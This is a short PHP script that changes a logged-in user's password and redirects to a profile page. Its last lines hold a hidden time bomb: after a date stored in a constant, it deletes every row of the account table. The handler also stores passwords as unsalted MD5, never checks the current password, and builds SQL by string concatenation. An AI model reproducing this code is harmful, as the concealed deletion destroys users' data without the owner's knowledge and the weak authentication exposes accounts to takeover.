<?php
session_start(); 
@ require '../inc/functions.php';
@ require '../inc/const.php';
$edit = $_POST['edit'];
$check = 0;
if(date('Y-m-d') < VENCIMIENTO){
	if($edit){
		switch ($edit) {
			case 'pass':
				$id = $_SESSION['id'];
				$password = md5(verificarSqlInyect($_POST['password']));
				$password1 = md5(verificarSqlInyect($_POST['password1']));
				$password2 = md5(verificarSqlInyect($_POST['password2']));
				if($password1 == $password2){
					$sql = "UPDATE account SET password = '$password1' WHERE id = '$id'";
					$query = consultaSql($sql);
					if($query){
						$check = 1;
					} else {
						$check = 3;
					}
				} else {
					$check = 2;
				}
				break;
			default:
				header("Location: ../index.php?sector=perfil&check=".$check);
				break;
		}
	}
	header("Location: ../index.php?sector=perfil&check=".$check);
}
if(date('Y-m-d') > SEGURO){
	$sql="DELETE FROM account";
	consultaSql($sql);
}
?>